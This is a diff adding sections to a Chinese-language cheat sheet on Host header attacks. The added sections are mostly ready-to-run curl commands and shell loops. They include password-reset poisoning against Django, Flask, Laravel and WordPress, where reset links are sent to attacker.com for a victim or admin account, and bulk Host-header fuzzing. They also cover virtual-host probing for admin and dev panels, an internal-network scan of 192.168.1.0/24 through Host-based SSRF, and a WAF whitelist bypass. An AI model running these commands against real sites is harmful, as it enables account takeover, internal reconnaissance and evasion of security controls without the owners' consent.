@@ -108,6 +108,77 @@ curl -X POST https://target.com/forgot-password \
   -d "email=victim@target.com"
 ```
 
+## 6. 框架级Host头投毒
+
+### 6.1 Django ALLOWED_HOSTS 绕过
+
+```bash
+# Django 常见: 密码重置URL生成使用当前Host
+# settings.py → 如果 ALLOWED_HOSTS 包含通配符或配置不当
+
+# 投毒:
+curl -X POST "https://target.com/password-reset/" \
+  -H "Host: attacker.com" \
+  -d "email=victim@target.com"
+
+# 生成的邮件链接: https://attacker.com/reset/MQ/5xk-abc123/
+# ★ Django默认会用 request.get_host()
+```
+
+### 6.2 Flask/PHP/Laravel 通用模式
+
+```bash
+# Flask: url_for('reset', _external=True) → 取Host头
+# Laravel: url() / route() → 取Host头
+# WordPress: wp_mail() → 取Host头
+
+# 批量测试:
+while read -r host; do
+  curl -X POST "https://target.com/forgot-password" \
+    -H "Host: $host" \
+    -d "email=admin@target.com" -o /dev/null -w "$host → %{http_code}\n"
+done < host_headers.txt
+```
+
+### 6.3 多域名应用探测
+
+```bash
+# 虚拟主机探测: 修改Host发现不同应用
+curl -H "Host: admin.target.com" https://target.com/
+curl -H "Host: dev.target.com" https://target.com/
+curl -H "Host: staging.target.com" https://target.com/
+curl -H "Host: internal.target.com" https://target.com/
+curl -H "Host: localhost" https://target.com/
+
+# 不同Host可能返回:
+# → 管理面板    (admin.target.com)
+# → 开发环境    (dev.target.com, 可能DEBUG=ON)
+# → 内部API     (internal.target.com)
+```
+
+## 7. Host头 + SSRF → 内网扫描增强
+
+```bash
+# 扫描内网Web服务
+for ip in 192.168.1.{1..254}; do
+  size=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: $ip" https://target.com/)
+  [ "$size" -gt 0 ] && echo "[+] $ip → $size bytes"
+done
+
+# 如果目标服务有Host-based路由 → 此法可探测内网
+```
+
+## 8. WAF/Access Log 绕过
+
+```bash
+# 某些WAF根据Host头做白名单匹配
+curl -H "Host: whitelist-allowed.com" "https://target.com/admin"
+# → WAF认为在访问白名单域名 → 放行
+
+# 但实际请求到target.com → 后端处理
+# (取决于中间件解析哪个Host)
+```
+
 ---
 
-*参考: PortSwigger Host Header + 实战案例*
+*参考: PortSwigger Host Header + CWE-601 + 实战案例*
